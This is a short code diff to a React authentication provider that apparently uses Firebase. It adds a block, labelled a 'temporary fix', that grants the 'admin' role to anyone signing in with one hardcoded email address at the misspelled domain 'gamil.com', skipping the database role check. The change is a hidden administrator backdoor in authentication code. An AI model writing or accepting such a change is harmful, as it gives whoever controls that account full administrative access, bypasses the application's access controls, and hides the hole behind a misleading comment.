@@ -37,6 +37,13 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
       return;
     }
 
+    // Temporary fix to grant admin role to a specific user
+    if (authUser.email === 'golpbalperalventure@gamil.com') {
+      setUser({ ...authUser, role: 'admin' });
+      setLoading(false);
+      return;
+    }
+
     const userRef = doc(db, 'users', authUser.uid);
     const unsubscribe = onSnapshot(userRef, (docSnap) => {
         if (docSnap.exists()) {
